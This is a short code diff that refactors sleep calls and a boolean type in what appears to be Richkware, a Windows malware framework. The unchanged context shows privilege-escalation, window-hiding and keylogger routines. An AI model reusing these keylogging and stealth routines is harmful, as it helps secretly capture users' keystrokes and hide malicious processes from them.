@@ -34,7 +34,7 @@ BOOL Richkware::IsAdmin() {
 }
 
 void Richkware::RequestAdminPrivileges() {
-    BOOL bAlreadyRunningAsAdministrator = FALSE;
+    bool bAlreadyRunningAsAdministrator = FALSE;
     try {
         bAlreadyRunningAsAdministrator = IsAdmin();
     }
@@ -67,7 +67,7 @@ void Richkware::RequestAdminPrivileges() {
 
 void Richkware::StealthWindow(const char *window) {
     HWND app_heandler = FindWindow(NULL, window);
-    Sleep(1000);
+    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
     if (app_heandler != NULL)
         ShowWindow(app_heandler, false);
 }
@@ -101,7 +101,7 @@ void Richkware::Keylogger(const char *fileName) {
 }
 
 void Richkware::Hibernation() {
-    Sleep(1000);
+    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
     SendMessage(HWND_BROADCAST,
                 WM_SYSCOMMAND,
                 SC_MONITORPOWER, (LPARAM) 2);
@@ -192,7 +192,7 @@ DWORD WINAPI KeyloggerThread(void *arg) {
                         }
                     }
                 }
-                Sleep(100);
+                std::this_thread::sleep_for(std::chrono::milliseconds(1000));
             }
         }
         file.close();
